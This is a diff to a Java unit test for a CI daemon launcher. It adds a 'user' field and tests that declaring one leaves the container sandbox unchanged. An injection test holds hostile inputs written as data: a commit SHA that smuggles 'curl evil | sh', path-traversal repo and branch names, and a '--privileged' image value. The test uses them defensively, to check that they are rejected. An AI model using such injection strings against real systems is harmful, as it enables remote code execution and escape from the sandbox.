@@ -80,6 +80,7 @@ public class CiDaemonLauncherTest {
           "http://qits-artifacts:8080/artifacts/daemons/qits-ci-daemon/deadbeef",
           0,
           false,
+          "",
           Map.of());
 
   /** The same step, having declared {@code docker: true} — the only difference anywhere. */
@@ -100,7 +101,26 @@ public class CiDaemonLauncherTest {
         original.daemonBinaryUrl(),
         original.stepTimeoutSeconds(),
         docker,
+        original.user(),
         original.env());
+  }
+
+  /** The same step, having declared {@code user: build} — again the only difference anywhere. */
+  private LaunchSpec asBuildUser() {
+    return new LaunchSpec(
+        spec.runId(),
+        spec.stepIndex(),
+        spec.repoId(),
+        spec.branch(),
+        spec.sha(),
+        spec.image(),
+        spec.daemonId(),
+        spec.secret(),
+        spec.daemonBinaryUrl(),
+        spec.stepTimeoutSeconds(),
+        spec.docker(),
+        "build",
+        spec.env());
   }
 
   /** The environment every step container gets, in the order the spec writes it. */
@@ -152,7 +172,8 @@ public class CiDaemonLauncherTest {
                 false,
                 new Security(true, true, "4g", "4g", 2048L, "2"),
                 null,
-                "qits-ci-01234567-412621e6-2"),
+                "qits-ci-01234567-412621e6-2",
+                ""),
             // 60 register + 120 initialize + 900 default step + 60 grace + 900 slop.
             Policy.ephemeral(2040L),
             Recreate.never),
@@ -195,7 +216,8 @@ public class CiDaemonLauncherTest {
         false,
         original.security(),
         original.pullPolicy(),
-        original.explicitName());
+        original.explicitName(),
+        original.user());
   }
 
   @Test
@@ -215,6 +237,54 @@ public class CiDaemonLauncherTest {
           entry.getValue().contains("docker.sock"),
           "no step may see a docker socket it did not ask for: " + entry);
     }
+  }
+
+  @Test
+  public void aStepThatDeclaredAUserRunsAsThatUserAndNothingElseChanges() {
+    EnsureRequest plain = launcher().buildWorkloadSpec(spec);
+    EnsureRequest asBuild = launcher().buildWorkloadSpec(asBuildUser());
+
+    assertEquals("build", asBuild.spec().user());
+
+    // Exactly one field, the same claim the socket pair makes: the sandbox does not relax for a
+    // step that dropped root, and nothing else about the request moves. The declaration is here at
+    // all because the container cannot do it itself — --cap-drop=ALL leaves no CAP_SETUID for `su`
+    // and no CAP_CHOWN for the checkout, measured 2026-08-12 on qits-containers.
+    assertNotEquals(plain, asBuild);
+    assertEquals(
+        plain,
+        new EnsureRequest(withoutUser(asBuild.spec()), asBuild.policy(), asBuild.recreate()));
+    assertTrue(asBuild.spec().security().capDropAll());
+    assertTrue(asBuild.spec().security().noNewPrivileges());
+  }
+
+  /** The one field under test, put back to what a step that declared nothing would have sent. */
+  private static Spec withoutUser(Spec original) {
+    return new Spec(
+        original.image(),
+        original.entrypoint(),
+        original.args(),
+        original.env(),
+        original.extraLabels(),
+        original.network(),
+        original.aliases(),
+        original.addHosts(),
+        original.volumeMounts(),
+        original.sharedMounts(),
+        original.hostDockerSocket(),
+        original.security(),
+        original.pullPolicy(),
+        original.explicitName(),
+        "");
+  }
+
+  @Test
+  public void aStepThatDeclaredNoUserRunsAsTheImagesOwn() {
+    // The absence, asserted on its own. An unset user means the image's default, and a value that
+    // appeared unasked would run every existing pipeline as somebody its image never provisioned —
+    // which fails deep inside a build with a permission error rather than at the launch.
+    assertEquals("", launcher().buildWorkloadSpec(spec).spec().user());
+    assertEquals("", launcher().buildWorkloadSpec(publishing()).spec().user());
   }
 
   @Test
@@ -297,6 +367,7 @@ public class CiDaemonLauncherTest {
             spec.daemonBinaryUrl(),
             spec.stepTimeoutSeconds(),
             false,
+            "",
             Map.of("QITS_EVENT_VERSION", "1.2.3", "QITS_EVENT_NAME", "SoftwareRelease"));
 
     Map<String, String> expected = contractEnv();
@@ -330,6 +401,7 @@ public class CiDaemonLauncherTest {
             spec.daemonBinaryUrl(),
             3600,
             false,
+            "",
             Map.of());
     // 60 + 120 + 3600 + 60 + 900
     assertEquals(4740L, launcher().maxAgeSeconds(longStep));
@@ -434,22 +506,22 @@ public class CiDaemonLauncherTest {
   public void hostileIdentifiersAreRejectedBeforeAnyCallIsMade() {
     CiDaemonLauncher launcher = launcher();
     LaunchSpec injectedSha =
-        new LaunchSpec("run", 0, "repo-1", "main", "x\"; curl evil | sh #", "img", "d", "s", "u", 0, false, Map.of());
+        new LaunchSpec("run", 0, "repo-1", "main", "x\"; curl evil | sh #", "img", "d", "s", "u", 0, false, "", Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(injectedSha));
     LaunchSpec traversal =
-        new LaunchSpec("run", 0, "../../etc", "main", "cafebabe", "img", "d", "s", "u", 0, false, Map.of());
+        new LaunchSpec("run", 0, "../../etc", "main", "cafebabe", "img", "d", "s", "u", 0, false, "", Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(traversal));
     LaunchSpec injectedBranch =
-        new LaunchSpec("run", 0, "repo-1", "main/../..", "cafebabe", "img", "d", "s", "u", 0, false, Map.of());
+        new LaunchSpec("run", 0, "repo-1", "main/../..", "cafebabe", "img", "d", "s", "u", 0, false, "", Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(injectedBranch));
     // The image is repo-declared rather than intake-supplied, and it still reaches a docker argv on
     // the far side of the wire. Nothing is known to get through it, but an argument that can be read
     // as an option is not a thing to leave to another service's good manners.
     LaunchSpec optionShapedImage =
-        new LaunchSpec("run", 0, "repo-1", "main", "cafebabe", "--privileged", "d", "s", "u", 0, false, Map.of());
+        new LaunchSpec("run", 0, "repo-1", "main", "cafebabe", "--privileged", "d", "s", "u", 0, false, "", Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(optionShapedImage));
     LaunchSpec blankImage =
-        new LaunchSpec("run", 0, "repo-1", "main", "cafebabe", "  ", "d", "s", "u", 0, false, Map.of());
+        new LaunchSpec("run", 0, "repo-1", "main", "cafebabe", "  ", "d", "s", "u", 0, false, "", Map.of());
     assertThrows(BadRequestException.class, () -> launcher.launch(blankImage));
   }
 
